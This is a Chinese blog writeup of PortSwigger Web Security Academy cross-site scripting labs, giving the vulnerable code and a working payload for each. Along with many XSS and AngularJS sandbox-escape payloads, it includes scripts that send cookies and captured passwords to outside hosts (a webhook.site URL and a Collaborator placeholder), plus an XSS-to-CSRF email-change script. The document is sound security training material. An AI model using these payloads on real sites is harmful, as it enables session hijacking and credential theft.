---
title: "Portswigger Web lab writeup: Cross-site scripting"
date: 2023-08-29T00:00:00+08:00
---

_前面还有几道以前做的 毕竟简单不是很有必要重新记录_

## Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in jQuery selector sink using a hashchange event

JQuery: 

```js
$(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
```

当 URL 的片段标识符更改时，将触发**hashchange**事件，传递到 Jquery 选择器，选择到 h2 中 存在 `decodeURIComponent(window.location.hash.slice(1))` 的元素（自然是不存在）。然后`scrollIntoView()`使用户可见。

因而 payload 要触发 haschange 事件。


```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into attribute with angle brackets HTML-encoded

属性注入。这个我熟 

查阅 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```js
" autofocus onfocusin=alert(window.origin) b="
```

## Lab: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into anchor `href` attribute with double quotes HTML-encoded

要实现点击名字的时候alert，测试发现点击跳转到填入的website。js伪协议直接过

```js
javascript:alert(window.origin)
```

也就是a.href的滥用

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets HTML encoded

```js
 var searchTerms = 'search参数';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

JS的内容直接来源于参数，应该是做了啥模板渲染的。注入js代码

```
%27;%0aalert(window.origin);%0ab='
```

## Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

直接Inject

```
/product?productId=1&storeId=<script>alert(window.origin)</script>
```

## Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in AngularJS expression with angle brackets and double quotes HTML-encoded

url参数在`><`中间，尖括号转义。无法逃出

而由于AngularJS的引入，可以 CSTI

```
{{$on.constructor('alert(window.origin)')()}}
```

另外 AngularJS gadget (SSTI)还可以用来 bypass CSP 。payload 收集：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md 以及 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected

## Lab: Reflected [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

调用了`/search-results?search=123`的 api 做了一个 ajax (应该算是吧)。脚本中直接拼接 responseText eval了，如果 api 可以注入那就可以实现 alert。

测试发现 api 的转义策略有问题，输入`\"`返回就不是合法 json 了，escape 掉了一个引号

构造合法 json

```
\"-alert(window.origin)}//
```

由于这个`-`仅仅是计算符号，改成`*`或`/`都行。而`+`因为会被 http 协议认作空格所以不能正常利用。改成`%2B`就可以了

```
\"%2Balert()}//
```

## Lab: Stored [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

随便点一个文章`Ctrl + U`可以看到没有评论。可以判断为前端渲染

```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

js 中`replace`只会替换字符的第一次出现。所以 content 填入`<><img src=x onerror=alert(window.origin)/>`可以直接过

_这里发现 svg 好像不能在 p 元素里用 小记一下_

然后再测试了看起来好像存在的`Obfuscating attacks via HTML encoding`。由于提取文字用的是`innerHTML`而不是`innerText`无法实现。

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with most tags and attributes blocked

之前挖自己学校遇到过[类似的](https://src.sjtu.edu.cn/post/237670/)，不过是存储型的。也就是 [cheet sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 找一个不常见的属性。

```html
123"><style>@keyframes x{}</style><input style="animation-name:x" onanimationend="1+1;b=document;a=window.alert;a(b.cookie)"</input>"
```

~~_这个存储型+导致登录凭证泄露竟然给我低危🫠。。_~~

这题的合法tag和attributes属实难找。不想写批量检测的，遂抄答案了

```html
"><body onresize=print()>
```

`onresize`事件在`窗口或框架被调整大小时`发生。由于给了exploit-server，用 iframe 修改框架大小

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

题解是用的 `burp Intruder`检测。看来 xss 字典还是有必要的。

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with all tags blocked except custom ones

```html
/?search=<xss+id%3Dx+onfocus%3Dalert(document.cookie)%20tabindex=1>#x
```

用`location.hash`配合 id 自动 focus 到元素上触发 onfocus 事件。学到了

exploit-server 可以用 meta refresh 跳转

```html
<meta http-equiv="refresh" content="0; url='https://0a6400b20383db3782698d65007c00b9.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'">
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) with some SVG markup allowed

这一关没有字符处理，只有返回黑名单。

[XSS Cheet Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 有个功能是 Copy tags/event/payloads，和`Burp Suite`的 Intruder 功能格式也对接好了。可以直接 Copy-Paste 到 payloads 里

测试发现只有`<svg>`、`<animatetransform>`、`<title> `和 `<image>`是 valid tag。然后测试`<svg>`的属性/事件，发现全部invalid。`<svg>`还有后面连接`animatetransform`、`animatemotion`、`animate`的用法，测试发现`animatetransform`可以使用

然后再对`animatetransform`的事件/属性进行测试，

```html
/?search="><svg><animatetransform onbegin=alert(1)>
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) in canonical link tag

后端界面渲染。会把`<link rel="canonical" href="https://0a6e00520312cce98c1ab92f007d0027.web-security-academy.net/?[input]">`渲染到canonical head里面。

[canonical](https://www.1deng.me/canonical-url.html#shen_me_shi_canonical_URL_biao_qian)标签 被称作规范网址，是用来给爬虫机器人看的（配置可以提高SEO）

那么就可以直接注入属性。题解给出的属性是`accesskey`，由键盘触发。另外注入的其他属性似乎在canonical下不生效。

![image-20230912144444581](webacademy XSS/image-20230912144444581.png)

```html
/?'accesskey='x'onclick='alert(document.domain)
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with single quote and backslash escaped

```js
var searchTerms = '{{inupt}}';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

错误的转义策略：没有转义斜杠和尖括号。

直接注入`<script>`标签。

```html
</script><script>alert(document.domain)</script>
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets

前端渲染

```js
var searchTerms = '{{input}}';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

反斜杠没有被正确转义

```js
\'-alert(document.domain)//
```

## Lab: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into `onclick` event with angle brackets and double

存储型。后端渲染

```html
<a id="author" href="https://ww.adsd" onclick="var tracker={track(){}};tracker.track('{{website}}');">1234</a>
```

单双引号、反斜杠均过滤。而onclick事件在触发时会进行一次html实体解码

```html
http://foo?&apos;-alert(document.domain)-&apos;
```

## Lab: Reflected XSS into a template literal with angle brackets,

后端渲染，但是该转义的都转义了。

```js
var message = `0 search results for '{{input}}'`;
document.getElementById('searchMessage').innerText = message;
```

但是渲染的字符串在 js 中被飘号（反引号）包裹。用 js 格式化字符串xss。

```html
/?search=${alert(document.domain)}
```

## Lab: Exploiting cross-site scripting to steal cookies

想着简单一点直接改location结果找不到report..然后才发现只允许使用burp提供的公共服务器

```html
<script>window.location='https://webhook.site/cb9f69b1-bad8-46f1-8a14-a8249b19b89f/?cookie='+document.cookie</script>
```

反正是对自己 xss 成功了。那就当我解出了吧💦💦

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

**POST的方式

## Lab: Exploiting cross-site scripting to capture passwords

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

HTML注入🤔以前没看过。不过也确实是一种拿密码的攻击方式。

## Lab: [Exploiting XSS](https://portswigger.net/web-security/cross-site-scripting/exploiting) to perform CSRF

利用 XSS 到 CSRF。因为有 csrf token 所以要特别处理

```html
<script>
(async() => {
    var email = 'gtg@thebearhimself.rest';
	var csrf = await fetch('/my-account')
		.then((response)=>{return response.text();})
		.then((html)=>{return html.match(/(?<=value\=")[A-Za-z0-9]+(?=")/)[0];});
	fetch('/my-account/change-email',{
    	method: 'POST',
		mode: 'no-cors',
    	headers: {
    		'Content-Type': 'application/x-www-form-urlencoded'
    	},
		body: `email=${email}&csrf=${csrf}`
	})
})();
</script>
```

~~tbh 因为console和page的异步差异卡了许久~~

题解给的用的是古老的`XMLHttpRequest`api：

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) with AngularJS sandbox escape without strings

```html
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
$scope.query = {};
var key = 'search';
$scope.query[key] = '123';
$scope.value = $parse(key)($scope.query);
});</script>
<h1 ng-controller=vulnCtrl>0 search results for {{value}}</h1>
```

$scope 用于规范当前作用域（没搜到 应该是和这个controller相关的

[$parse](https://docs.angularjs.org/api/ng/service/$parse) 的功能是将 AngularJS 表达式转换为函数。类似 JS 中 function constructor 的感觉

通过原型设置`String.charAt`破坏沙箱逻辑，然后将数组传递给 orderBy 过滤器。再次使用 toString() 创建字符串和 String 构造函数属性来设置过滤器的参数，再使用`fromCharCode`方法通过将字符代码转换为字符串`x=alert(1)`来生成 payload。

```js
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

~~有点难、也许应该先读一读 AngularJS 源码~~

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) with AngularJS sandbox escape and CSP

```htaccess
Content-Security-Policy: 
default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
```

script 指定了仅同源

题解通过 hash 触发 AngularJS 中的`ng-focus`。payload中冒号表示正在发送到过滤器的参数。在参数中，我们没有直接调用警报函数，而是将其分配给变量 z。仅当 orderBy 操作到达 $event.path 数组中的 window 对象时才会调用该函数。这意味着它可以在窗口范围内调用，而无需显式引用`window`对象，从而有效地绕过 AngularJS 的`window`检查。

```html
<script>
location.href="https://0a580013046fcd29842ff495005000f3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x"
</script>
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) with event handlers and `href` attributes blocked

限制了href属性但是要做到 Click button 利用。通过 svg:animate 设置额外的参数。

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

```html
https://0a750087032fc49e810b346d00650005.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) in a JavaScript URL with some characters blocked

反射型但是不再有`search`服务了。只能通过`post`界面来达成

后端会将 GET 参数渲染出一个 a 元素出来。

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'<encodeURIComponent(input)>'}).finally(_ => window.location = '/')">Back to Blog</a>
```

不过这个编码不用管。毕竟是 javascript 伪协议，提取时会解码一次。简单测试可以知道block掉了空格和括号和分号

闭合前半 json，然后就可以通过`,`运算符的方式执行多个表达式。要绕过括号的限制，只能通过覆盖 js runtime 隐式执行的函数、配合 throw error 来实现。

[onerror](https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource/error_event) 方法用于自定义错误处理，与`Error.prepareStackTrace`不同的是它仅适用于浏览器。它似乎与`EventSource`的 onerror 有区别（？

```js
/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{a:'
```

覆盖了`onerror`和`toString`。在调用`window+''`时会隐式执行`toString`，`toString`执行触发报错，throw 出一个 1337 被`onerror`接收成为参数执行。还蛮神奇的u1s1

格式化后的 payload 长这样

```js
fetch('/analytics', {
    method: 'post',
    body: '/post?postId=5&'
}, x = x=>{
    throw /**/
    EventSource.onerror = alert,
    1337
}
, toString = x, window + '', {
    a: ''
}).finally(_=>window.location = '/')
```

## Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

`dangling markup attack`翻译为悬空标记攻击，就是在XSS的基础上设置未闭合引号，造成浏览器解析问题以窃取其后的敏感信息（一般是CSRF Token）

以前见过一题 CTF 关于`dangling markup attack`，是在后台记录输入账密的地方故意留下悬空标记，然后等管理员登录后闭合以窃取管理员账密。还是比较有趣的。

这题还有一部分是 CSP 问题

```js
default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

不过并没有用到 bypass 而是直接 CSRF。

## Lab: Reflected XSS protected by CSP, with CSP bypass

CSP: `default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=`

注意到CSP携带了一个token参数。可以注入利用`script-src-elem`来启用内敛脚本。

```html
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

_感觉不能叫 bypass ，应该是 Injection_



完结喽~
